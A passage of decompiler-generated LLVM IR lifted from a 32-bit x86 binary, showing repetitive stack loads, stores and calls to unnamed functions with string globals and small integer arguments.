  %v2_80487ba = load i32, i32* %v1_80487ba, align 4
  store i32 %v2_80487ba, i32* @ebx, align 4
  %v1_80487bb = add i32 %v0_80487ba, 10388
  store i32 %v1_80487bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487bb, i32* %v1_80487ba, align 4
  %v2_80487c3 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_80487c3, i32* %eax.global-to-local, align 4
  %v0_80487c8 = load i32, i32* @esp, align 4
  %v1_80487c8 = inttoptr i32 %v0_80487c8 to i32*
  %v2_80487c8 = load i32, i32* %v1_80487c8, align 4
  store i32 %v2_80487c8, i32* %edx.global-to-local, align 4
  %v3_80487c8 = add i32 %v0_80487c8, 4
  %v1_80487c9 = inttoptr i32 %v3_80487c8 to i32*
  %v2_80487c9 = load i32, i32* %v1_80487c9, align 4
  store i32 %v2_80487c9, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_8054acf.8 to i32), i32* %v1_80487c9, align 4
  %v1_80487cf = add i32 %v0_80487c8, 10388
  store i32 %v1_80487cf, i32* %edx.global-to-local, align 4
  %v2_80487d6 = add i32 %v1_80487cf, %v2_80487c3
  store i32 %v2_80487d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80487d6, i32* %v1_80487c8, align 4
  %v3_80487da = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487da, i32* %eax.global-to-local, align 4
  %v0_80487df = load i32, i32* @esp, align 4
  %v1_80487df = inttoptr i32 %v0_80487df to i32*
  %v2_80487df = load i32, i32* %v1_80487df, align 4
  store i32 %v2_80487df, i32* @ebx, align 4
  %v1_80487e0 = add i32 %v0_80487df, 10388
  store i32 %v1_80487e0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487e0, i32* %v1_80487df, align 4
  %v2_80487e8 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_80487e8, i32* %eax.global-to-local, align 4
  %v0_80487ed = load i32, i32* @esp, align 4
  %v1_80487ed = inttoptr i32 %v0_80487ed to i32*
  %v3_80487ed = add i32 %v0_80487ed, 4
  %v0_80487ee = load i32, i32* @edi, align 4
  %v1_80487ee = add i32 %v0_80487ee, 20
  store i32 %v1_80487ee, i32* %edx.global-to-local, align 4
  %v1_80487f1 = inttoptr i32 %v3_80487ed to i32*
  %v2_80487f1 = load i32, i32* %v1_80487f1, align 4
  store i32 %v2_80487f1, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487ee, i32* %v1_80487f1, align 4
  %v1_80487f3 = add i32 %v0_80487ed, 10388
  store i32 %v1_80487f3, i32* %edx.global-to-local, align 4
  %v2_80487fa = add i32 %v1_80487f3, %v2_80487e8
  store i32 %v2_80487fa, i32* %eax.global-to-local, align 4
  store i32 %v2_80487fa, i32* %v1_80487ed, align 4
  %v3_80487fe = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487fe, i32* %eax.global-to-local, align 4
  %v0_8048803 = load i32, i32* @esp, align 4
  %v1_8048803 = inttoptr i32 %v0_8048803 to i32*
  %v2_8048803 = load i32, i32* %v1_8048803, align 4
  store i32 %v2_8048803, i32* @ebx, align 4
  %v1_8048804 = add i32 %v0_8048803, 10388
  store i32 %v1_8048804, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048804, i32* %v1_8048803, align 4
  %v2_804880c = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_804880c, i32* %eax.global-to-local, align 4
  %v0_8048811 = load i32, i32* @esp, align 4
  %v1_8048811 = inttoptr i32 %v0_8048811 to i32*
  %v2_8048811 = load i32, i32* %v1_8048811, align 4
  store i32 %v2_8048811, i32* %edx.global-to-local, align 4
  %v3_8048811 = add i32 %v0_8048811, 4
  %v1_8048812 = inttoptr i32 %v3_8048811 to i32*
  %v2_8048812 = load i32, i32* %v1_8048812, align 4
  store i32 %v2_8048812, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8054ae7.9 to i32), i32* %v1_8048812, align 4
  %v1_8048818 = add i32 %v0_8048811, 10388
  store i32 %v1_8048818, i32* %edx.global-to-local, align 4
  %v2_804881f = add i32 %v1_8048818, %v2_804880c
  store i32 %v2_804881f, i32* %eax.global-to-local, align 4
  store i32 %v2_804881f, i32* %v1_8048811, align 4
  %v3_8048823 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048823, i32* %eax.global-to-local, align 4
  %v0_8048828 = load i32, i32* @esp, align 4
  %v1_8048828 = inttoptr i32 %v0_8048828 to i32*
  %v2_8048828 = load i32, i32* %v1_8048828, align 4
  store i32 %v2_8048828, i32* @ebx, align 4
  %v1_8048829 = add i32 %v0_8048828, 10388
  store i32 %v1_8048829, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048829, i32* %v1_8048828, align 4
  %v2_8048831 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048831, i32* %eax.global-to-local, align 4
  %v0_8048836 = load i32, i32* @esp, align 4
  %v1_8048836 = inttoptr i32 %v0_8048836 to i32*
  %v3_8048836 = add i32 %v0_8048836, 4
  %v0_8048837 = load i32, i32* @edi, align 4
  %v1_8048837 = add i32 %v0_8048837, 789
  store i32 %v1_8048837, i32* %edx.global-to-local, align 4
  %v1_804883d = inttoptr i32 %v3_8048836 to i32*
  %v2_804883d = load i32, i32* %v1_804883d, align 4
  store i32 %v2_804883d, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048837, i32* %v1_804883d, align 4
  %v1_804883f = add i32 %v0_8048836, 10388
  store i32 %v1_804883f, i32* %edx.global-to-local, align 4
  %v2_8048846 = add i32 %v1_804883f, %v2_8048831
  store i32 %v2_8048846, i32* %eax.global-to-local, align 4
  store i32 %v2_8048846, i32* %v1_8048836, align 4
  %v3_804884a = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804884a, i32* %eax.global-to-local, align 4
  %v0_804884f = load i32, i32* @esp, align 4
  %v1_804884f = inttoptr i32 %v0_804884f to i32*
  %v2_804884f = load i32, i32* %v1_804884f, align 4
  store i32 %v2_804884f, i32* %eax.global-to-local, align 4
  %v1_8048850 = add i32 %v0_804884f, 10388
  store i32 %v1_8048850, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048850, i32* %v1_804884f, align 4
  %v2_8048858 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048858, i32* %eax.global-to-local, align 4
  %v0_804885d = load i32, i32* @esp, align 4
  %v1_804885d = inttoptr i32 %v0_804885d to i32*
  %v2_804885d = load i32, i32* %v1_804885d, align 4
  store i32 %v2_804885d, i32* %ecx.global-to-local, align 4
  %v3_804885d = add i32 %v0_804885d, 4
  %v1_804885e = inttoptr i32 %v3_804885d to i32*
  %v2_804885e = load i32, i32* %v1_804885e, align 4
  store i32 %v2_804885e, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v1_804885e, align 4
  %v1_8048864 = add i32 %v0_804885d, 10388
  store i32 %v1_8048864, i32* %edx.global-to-local, align 4
  %v2_804886b = add i32 %v1_8048864, %v2_8048858
  store i32 %v2_804886b, i32* %eax.global-to-local, align 4
  store i32 %v2_804886b, i32* %v1_804885d, align 4
  %v3_804886f = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804886f, i32* %eax.global-to-local, align 4
  %v0_8048874 = load i32, i32* @esp, align 4
  %v1_8048874 = inttoptr i32 %v0_8048874 to i32*
  store i32 32, i32* %v1_8048874, align 4
  %v2_804887b = call i32 @function_80512f0(i8 %v1_804887b)
  store i32 %v2_804887b, i32* %eax.global-to-local, align 4
  %v0_8048880 = load i32, i32* @esp, align 4
  %v1_8048880 = inttoptr i32 %v0_8048880 to i32*
  %v2_8048880 = load i32, i32* %v1_8048880, align 4
  store i32 %v2_8048880, i32* %eax.global-to-local, align 4
  %v3_8048880 = add i32 %v0_8048880, 4
  %v1_8048881 = inttoptr i32 %v3_8048880 to i32*
  %v2_8048881 = load i32, i32* %v1_8048881, align 4
  store i32 %v2_8048881, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048881, align 4
  store i32 32, i32* %v1_8048880, align 4
  %v3_8048886 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048886, i32* %eax.global-to-local, align 4
  store i32 %v3_8048886, i32* @ebx, align 4
  %v0_804888d = load i32, i32* @esp, align 4
  %v1_804888d = inttoptr i32 %v0_804888d to i32*
  %v2_804888d = load i32, i32* %v1_804888d, align 4
  store i32 %v2_804888d, i32* %eax.global-to-local, align 4
  %v1_804888e = add i32 %v0_804888d, 10388
  store i32 %v1_804888e, i32* %ecx.global-to-local, align 4
  store i32 %v1_804888e, i32* %v1_804888d, align 4
  %v2_8048896 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048896, i32* %eax.global-to-local, align 4
  %v0_804889b = load i32, i32* @esp, align 4
  %v1_804889b = inttoptr i32 %v0_804889b to i32*
  %v2_804889b = load i32, i32* %v1_804889b, align 4
  store i32 %v2_804889b, i32* %edx.global-to-local, align 4
  %v3_804889b = add i32 %v0_804889b, 4
  %v1_804889c = inttoptr i32 %v3_804889b to i32*
  %v2_804889c = load i32, i32* %v1_804889c, align 4
  store i32 %v2_804889c, i32* %ecx.global-to-local, align 4
  %v0_804889d = load i32, i32* @ebx, align 4
  store i32 %v0_804889d, i32* %v1_804889c, align 4
  %v1_804889e = add i32 %v0_804889b, 10388
  store i32 %v1_804889e, i32* %edx.global-to-local, align 4
  %v2_80488a5 = add i32 %v1_804889e, %v2_8048896
  store i32 %v2_80488a5, i32* %eax.global-to-local, align 4
  store i32 %v2_80488a5, i32* %v1_804889b, align 4
  %v3_80488a9 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488a9, i32* %eax.global-to-local, align 4
  %v0_80488ae = load i32, i32* @esp, align 4
  %v1_80488ae = inttoptr i32 %v0_80488ae to i32*
  store i32 32, i32* %v1_80488ae, align 4
  %v2_80488b5 = call i32 @function_8051270(i8 %v1_804887b)
  store i32 %v2_80488b5, i32* %eax.global-to-local, align 4
  %v0_80488ba = load i32, i32* @esp, align 4
  %v1_80488ba = inttoptr i32 %v0_80488ba to i32*
  %v2_80488ba = load i32, i32* %v1_80488ba, align 4
  store i32 %v2_80488ba, i32* %eax.global-to-local, align 4
  %v1_80488bb = add i32 %v0_80488ba, 10388
  store i32 %v1_80488bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488bb, i32* %v1_80488ba, align 4
  %v2_80488c3 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_80488c3, i32* %eax.global-to-local, align 4
  %v0_80488c8 = load i32, i32* @esp, align 4
  %v1_80488c8 = inttoptr i32 %v0_80488c8 to i32*
  %v2_80488c8 = load i32, i32* %v1_80488c8, align 4
  store i32 %v2_80488c8, i32* %ecx.global-to-local, align 4
  %v3_80488c8 = add i32 %v0_80488c8, 4
  %v1_80488c9 = inttoptr i32 %v3_80488c8 to i32*
  %v2_80488c9 = load i32, i32* %v1_80488c9, align 4
  store i32 %v2_80488c9, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v1_80488c9, align 4
  %v1_80488cf = add i32 %v0_80488c8, 10388
  store i32 %v1_80488cf, i32* %edx.global-to-local, align 4
  %v2_80488d6 = add i32 %v1_80488cf, %v2_80488c3
  store i32 %v2_80488d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80488d6, i32* %v1_80488c8, align 4
  %v3_80488da = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488da, i32* %eax.global-to-local, align 4
  %v0_80488df = load i32, i32* @esp, align 4
  %v1_80488df = inttoptr i32 %v0_80488df to i32*
  store i32 33, i32* %v1_80488df, align 4
  %v2_80488e6 = call i32 @function_80512f0(i8 %v1_804887b)
  store i32 %v2_80488e6, i32* %eax.global-to-local, align 4
  %v0_80488eb = load i32, i32* @esp, align 4
  %v1_80488eb = inttoptr i32 %v0_80488eb to i32*
  %v2_80488eb = load i32, i32* %v1_80488eb, align 4
  store i32 %v2_80488eb, i32* %eax.global-to-local, align 4
  %v3_80488eb = add i32 %v0_80488eb, 4
  %v1_80488ec = inttoptr i32 %v3_80488eb to i32*
  %v2_80488ec = load i32, i32* %v1_80488ec, align 4
  store i32 %v2_80488ec, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80488ec, align 4
  store i32 33, i32* %v1_80488eb, align 4
  %v3_80488f1 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80488f1, i32* %eax.global-to-local, align 4
  store i32 %v3_80488f1, i32* @ebx, align 4
  %v0_80488f8 = load i32, i32* @esp, align 4
  %v1_80488f8 = inttoptr i32 %v0_80488f8 to i32*
  %v2_80488f8 = load i32, i32* %v1_80488f8, align 4
  store i32 %v2_80488f8, i32* %eax.global-to-local, align 4
  %v1_80488f9 = add i32 %v0_80488f8, 10388
  store i32 %v1_80488f9, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488f9, i32* %v1_80488f8, align 4
  %v2_8048901 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048901, i32* %eax.global-to-local, align 4
  %v0_8048906 = load i32, i32* @esp, align 4
  %v1_8048906 = inttoptr i32 %v0_8048906 to i32*
  %v2_8048906 = load i32, i32* %v1_8048906, align 4
  store i32 %v2_8048906, i32* %edx.global-to-local, align 4
  %v3_8048906 = add i32 %v0_8048906, 4
  %v1_8048907 = inttoptr i32 %v3_8048906 to i32*
  %v2_8048907 = load i32, i32* %v1_8048907, align 4
  store i32 %v2_8048907, i32* %ecx.global-to-local, align 4
  %v0_8048908 = load i32, i32* @ebx, align 4
  store i32 %v0_8048908, i32* %v1_8048907, align 4
  %v1_8048909 = add i32 %v0_8048906, 10388
  store i32 %v1_8048909, i32* %edx.global-to-local, align 4
  %v2_8048910 = add i32 %v1_8048909, %v2_8048901
  store i32 %v2_8048910, i32* %eax.global-to-local, align 4
  store i32 %v2_8048910, i32* %v1_8048906, align 4
  %v3_8048914 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048914, i32* %eax.global-to-local, align 4
  %v0_8048919 = load i32, i32* @esp, align 4
  %v1_8048919 = inttoptr i32 %v0_8048919 to i32*
  store i32 33, i32* %v1_8048919, align 4
  %v2_8048920 = call i32 @function_8051270(i8 %v1_804887b)
  store i32 %v2_8048920, i32* %eax.global-to-local, align 4
  %v0_8048925 = load i32, i32* @esp, align 4
  %v1_8048925 = inttoptr i32 %v0_8048925 to i32*
  %v2_8048925 = load i32, i32* %v1_8048925, align 4
  store i32 %v2_8048925, i32* %eax.global-to-local, align 4
  %v1_8048926 = add i32 %v0_8048925, 10388
  store i32 %v1_8048926, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048926, i32* %v1_8048925, align 4
  %v2_804892e = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_804892e, i32* %eax.global-to-local, align 4
  %v0_8048933 = load i32, i32* @esp, align 4
  %v1_8048933 = inttoptr i32 %v0_8048933 to i32*
  %v2_8048933 = load i32, i32* %v1_8048933, align 4
  store i32 %v2_8048933, i32* %ecx.global-to-local, align 4
  %v3_8048933 = add i32 %v0_8048933, 4
  %v1_8048934 = inttoptr i32 %v3_8048933 to i32*
  %v2_8048934 = load i32, i32* %v1_8048934, align 4
  store i32 %v2_8048934, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v1_8048934, align 4
  %v1_804893a = add i32 %v0_8048933, 10388
  store i32 %v1_804893a, i32* %edx.global-to-local, align 4
  %v2_8048941 = add i32 %v1_804893a, %v2_804892e
  store i32 %v2_8048941, i32* %eax.global-to-local, align 4
  store i32 %v2_8048941, i32* %v1_8048933, align 4
  %v3_8048945 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048945, i32* %eax.global-to-local, align 4
  %v0_804894a = load i32, i32* @esp, align 4
  %v1_804894a = inttoptr i32 %v0_804894a to i32*
  store i32 34, i32* %v1_804894a, align 4
  %v2_8048951 = call i32 @function_80512f0(i8 %v1_804887b)
  store i32 %v2_8048951, i32* %eax.global-to-local, align 4
  %v0_8048956 = load i32, i32* @esp, align 4
  %v1_8048956 = inttoptr i32 %v0_8048956 to i32*
  %v2_8048956 = load i32, i32* %v1_8048956, align 4
  store i32 %v2_8048956, i32* %eax.global-to-local, align 4
  %v3_8048956 = add i32 %v0_8048956, 4
  %v1_8048957 = inttoptr i32 %v3_8048956 to i32*
  %v2_8048957 = load i32, i32* %v1_8048957, align 4
  store i32 %v2_8048957, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048957, align 4
  store i32 34, i32* %v1_8048956, align 4
  %v3_804895c = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804895c, i32* %eax.global-to-local, align 4
  store i32 %v3_804895c, i32* @ebx, align 4
  %v0_8048963 = load i32, i32* @esp, align 4
  %v1_8048963 = inttoptr i32 %v0_8048963 to i32*
  %v2_8048963 = load i32, i32* %v1_8048963, align 4
  store i32 %v2_8048963, i32* %eax.global-to-local, align 4
  %v1_8048964 = add i32 %v0_8048963, 10388
  store i32 %v1_8048964, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048964, i32* %v1_8048963, align 4
  %v2_804896c = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_804896c, i32* %eax.global-to-local, align 4
  %v0_8048971 = load i32, i32* @esp, align 4
  %v1_8048971 = inttoptr i32 %v0_8048971 to i32*
  %v2_8048971 = load i32, i32* %v1_8048971, align 4
  store i32 %v2_8048971, i32* %edx.global-to-local, align 4
  %v3_8048971 = add i32 %v0_8048971, 4
  %v1_8048972 = inttoptr i32 %v3_8048971 to i32*
  %v2_8048972 = load i32, i32* %v1_8048972, align 4
  store i32 %v2_8048972, i32* %ecx.global-to-local, align 4
  %v0_8048973 = load i32, i32* @ebx, align 4
  store i32 %v0_8048973, i32* %v1_8048972, align 4
  %v1_8048974 = add i32 %v0_8048971, 10388
  store i32 %v1_8048974, i32* %edx.global-to-local, align 4
  %v2_804897b = add i32 %v1_8048974, %v2_804896c
  store i32 %v2_804897b, i32* %eax.global-to-local, align 4
  store i32 %v2_804897b, i32* %v1_8048971, align 4
  %v3_804897f = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804897f, i32* %eax.global-to-local, align 4
  %v0_8048984 = load i32, i32* @esp, align 4
  %v1_8048984 = inttoptr i32 %v0_8048984 to i32*
  store i32 34, i32* %v1_8048984, align 4
  %v2_804898b = call i32 @function_8051270(i8 %v1_804887b)
  store i32 %v2_804898b, i32* %eax.global-to-local, align 4
  %v0_8048990 = load i32, i32* @esp, align 4
  %v1_8048990 = inttoptr i32 %v0_8048990 to i32*
  %v1_8048991 = add i32 %v0_8048990, 10388
  store i32 %v1_8048991, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048991, i32* %v1_8048990, align 4
  %v2_8048999 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048999, i32* %eax.global-to-local, align 4
  %v0_804899e = load i32, i32* @esp, align 4
  %v1_804899e = inttoptr i32 %v0_804899e to i32*
  %v2_804899e = load i32, i32* %v1_804899e, align 4
  store i32 %v2_804899e, i32* @ebx, align 4
  %v3_804899e = add i32 %v0_804899e, 4
  %v1_804899f = inttoptr i32 %v3_804899e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v1_804899f, align 4
  %v1_80489a5 = add i32 %v0_804899e, 10388
  store i32 %v1_80489a5, i32* %edx.global-to-local, align 4
  %v2_80489ac = add i32 %v1_80489a5, %v2_8048999
  store i32 %v2_80489ac, i32* %eax.global-to-local, align 4
  store i32 %v2_80489ac, i32* %v1_804899e, align 4
  %v3_80489b0 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489b0, i32* %eax.global-to-local, align 4
  %v0_80489b5 = load i32, i32* @esp, align 4
  %v1_80489b5 = add i32 %v0_80489b5, 16
  %v1_80489b8 = add i32 %v0_80489b5, 68
  %v2_80489b8 = inttoptr i32 %v1_80489b8 to i32*
  %v3_80489b8 = load i32, i32* %v2_80489b8, align 4
  store i32 %v3_80489b8, i32* %ecx.global-to-local, align 4
  %v1_80489bc = icmp eq i32 %v3_80489b8, 0
  store i1 %v1_80489bc, i1* %zf.global-to-local, align 1
  br i1 %v1_80489bc, label %dec_label_pc_8048ad8, label %dec_label_pc_80489c4

dec_label_pc_80489c4:                             ; preds = %dec_label_pc_8048700
  %v9_80489c4 = icmp eq i32 %v0_80489b5, -4
  store i1 %v9_80489c4, i1* %zf.global-to-local, align 1
  %v2_80489c7 = inttoptr i32 %v0_80489b5 to i32*
  store i32 35, i32* %v2_80489c7, align 4
  %v2_80489c9 = call i32 @function_80512f0(i8 %v1_804887b)
  store i32 %v2_80489c9, i32* %eax.global-to-local, align 4
  %v0_80489ce = load i32, i32* @esp, align 4
  %v1_80489ce = inttoptr i32 %v0_80489ce to i32*
  %v2_80489ce = load i32, i32* %v1_80489ce, align 4
  store i32 %v2_80489ce, i32* %eax.global-to-local, align 4
  %v3_80489ce = add i32 %v0_80489ce, 4
  %v1_80489cf = inttoptr i32 %v3_80489ce to i32*
  %v2_80489cf = load i32, i32* %v1_80489cf, align 4
  store i32 %v2_80489cf, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80489cf, align 4
  store i32 35, i32* %v1_80489ce, align 4
  %v3_80489d4 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80489d4, i32* %eax.global-to-local, align 4
  store i32 %v3_80489d4, i32* @ebx, align 4
  %v0_80489db = load i32, i32* @esp, align 4
  %v1_80489db = inttoptr i32 %v0_80489db to i32*
  %v2_80489db = load i32, i32* %v1_80489db, align 4
  store i32 %v2_80489db, i32* %eax.global-to-local, align 4
  %v1_80489dc = add i32 %v0_80489db, 10388
  store i32 %v1_80489dc, i32* %ecx.global-to-local, align 4
  store i32 %v1_80489dc, i32* %v1_80489db, align 4
  %v2_80489e4 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_80489e4, i32* %eax.global-to-local, align 4
  %v0_80489e9 = load i32, i32* @esp, align 4
  %v1_80489e9 = inttoptr i32 %v0_80489e9 to i32*
  %v2_80489e9 = load i32, i32* %v1_80489e9, align 4
  store i32 %v2_80489e9, i32* %edx.global-to-local, align 4
  %v3_80489e9 = add i32 %v0_80489e9, 4
  %v1_80489ea = inttoptr i32 %v3_80489e9 to i32*
  %v2_80489ea = load i32, i32* %v1_80489ea, align 4
  store i32 %v2_80489ea, i32* %ecx.global-to-local, align 4
  %v0_80489eb = load i32, i32* @ebx, align 4
  store i32 %v0_80489eb, i32* %v1_80489ea, align 4
  %v1_80489ec = add i32 %v0_80489e9, 10388
  store i32 %v1_80489ec, i32* %edx.global-to-local, align 4
  %v2_80489f3 = add i32 %v1_80489ec, %v2_80489e4
  store i32 %v2_80489f3, i32* %eax.global-to-local, align 4
  store i32 %v2_80489f3, i32* %v1_80489e9, align 4
  %v3_80489f7 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489f7, i32* %eax.global-to-local, align 4
  %v0_80489fc = load i32, i32* @esp, align 4
  %v1_80489fc = inttoptr i32 %v0_80489fc to i32*
  store i32 35, i32* %v1_80489fc, align 4
  %v2_8048a03 = call i32 @function_8051270(i8 %v1_804887b)
  store i32 %v2_8048a03, i32* %eax.global-to-local, align 4
  %v0_8048a08 = load i32, i32* @esp, align 4
  %v1_8048a08 = inttoptr i32 %v0_8048a08 to i32*
  %v2_8048a08 = load i32, i32* %v1_8048a08, align 4
  store i32 %v2_8048a08, i32* %eax.global-to-local, align 4
  %v1_8048a09 = add i32 %v0_8048a08, 10388
  store i32 %v1_8048a09, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a09, i32* %v1_8048a08, align 4
  %v2_8048a11 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048a11, i32* %eax.global-to-local, align 4
  %v0_8048a16 = load i32, i32* @esp, align 4
  %v1_8048a16 = inttoptr i32 %v0_8048a16 to i32*
  %v2_8048a16 = load i32, i32* %v1_8048a16, align 4
  store i32 %v2_8048a16, i32* %ecx.global-to-local, align 4
  %v3_8048a16 = add i32 %v0_8048a16, 4
  %v1_8048a17 = inttoptr i32 %v3_8048a16 to i32*
  %v2_8048a17 = load i32, i32* %v1_8048a17, align 4
  store i32 %v2_8048a17, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v1_8048a17, align 4
  %v1_8048a1d = add i32 %v0_8048a16, 10388
  store i32 %v1_8048a1d, i32* %edx.global-to-local, align 4
  %v2_8048a24 = add i32 %v1_8048a1d, %v2_8048a11
  store i32 %v2_8048a24, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a24, i32* %v1_8048a16, align 4
  %v3_8048a28 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a28, i32* %eax.global-to-local, align 4
  %v0_8048a2d = load i32, i32* @esp, align 4
  %v1_8048a2d = inttoptr i32 %v0_8048a2d to i32*
  %v2_8048a2d = load i32, i32* %v1_8048a2d, align 4
  store i32 %v2_8048a2d, i32* %eax.global-to-local, align 4
  %v3_8048a2d = add i32 %v0_8048a2d, 4
  %v1_8048a2e = inttoptr i32 %v3_8048a2d to i32*
  %v2_8048a2e = load i32, i32* %v1_8048a2e, align 4
  store i32 %v2_8048a2e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048a2e, align 4
  store i32 40, i32* %v1_8048a2d, align 4
  %v3_8048a33 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048a33, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a33, i32* @ebx, align 4
  %v0_8048a3a = load i32, i32* @esp, align 4
  %v1_8048a3a = inttoptr i32 %v0_8048a3a to i32*
  %v2_8048a3a = load i32, i32* %v1_8048a3a, align 4
  store i32 %v2_8048a3a, i32* %eax.global-to-local, align 4
  %v1_8048a3b = add i32 %v0_8048a3a, 10388
  store i32 %v1_8048a3b, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a3b, i32* %v1_8048a3a, align 4
  %v2_8048a43 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048a43, i32* %eax.global-to-local, align 4
  %v0_8048a48 = load i32, i32* @esp, align 4
  %v1_8048a48 = inttoptr i32 %v0_8048a48 to i32*
  %v2_8048a48 = load i32, i32* %v1_8048a48, align 4
  store i32 %v2_8048a48, i32* %edx.global-to-local, align 4
  %v3_8048a48 = add i32 %v0_8048a48, 4
  %v1_8048a49 = inttoptr i32 %v3_8048a48 to i32*
  %v2_8048a49 = load i32, i32* %v1_8048a49, align 4
  store i32 %v2_8048a49, i32* %ecx.global-to-local, align 4
  %v0_8048a4a = load i32, i32* @ebx, align 4
  store i32 %v0_8048a4a, i32* %v1_8048a49, align 4
  %v1_8048a4b = add i32 %v0_8048a48, 10388
  store i32 %v1_8048a4b, i32* %edx.global-to-local, align 4
  %v2_8048a52 = add i32 %v1_8048a4b, %v2_8048a43
  store i32 %v2_8048a52, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a52, i32* %v1_8048a48, align 4
  %v3_8048a56 = call i32 @function_8051c60(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a56, i32* %eax.global-to-local, align 4
  %v0_8048a5b = load i32, i32* @esp, align 4
  %v1_8048a5b = inttoptr i32 %v0_8048a5b to i32*
  %v2_8048a5b = load i32, i32* %v1_8048a5b, align 4
  store i32 %v2_8048a5b, i32* @ebx, align 4
  %v1_8048a5c = add i32 %v0_8048a5b, 10388
  store i32 %v1_8048a5c, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a5c, i32* %v1_8048a5b, align 4
  %v2_8048a64 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8048a64, i32* %eax.global-to-local, align 4
  %v0_8048a69 = load i32, i32* @esp, align 4
  %v1_8048a69 = inttoptr i32 %v0_8048a69 to i32*
  %v2_8048a69 = load i32, i32* %v1_8048a69, align 4
  store i32 %v2_8048a69, i32* %edx.global-to-local, align 4
  %v3_8048a69 = add i32 %v0_8048a69, 4
  %v1_8048a6a = inttoptr i32 %v3_8048a69 to i32*
  %v2_8048a6a = load i32, i32* %v1_8048a6a, align 4
  store i32 %v2_8048a6a, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8054aff.7 to i32), i32* %v1_8048a6a, align 4
  %v1_8048a70 = add i32 %v0_8048a69, 10388
  store i32 %v1_8048a70, i32* %edx.global-to-local, align 4
  %v2_8048a77 = add i32 %v1_8048a70, %v2_8048a64
  store i32 %v2_8048a77, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a77, i32* %v1_8048a69, align 4
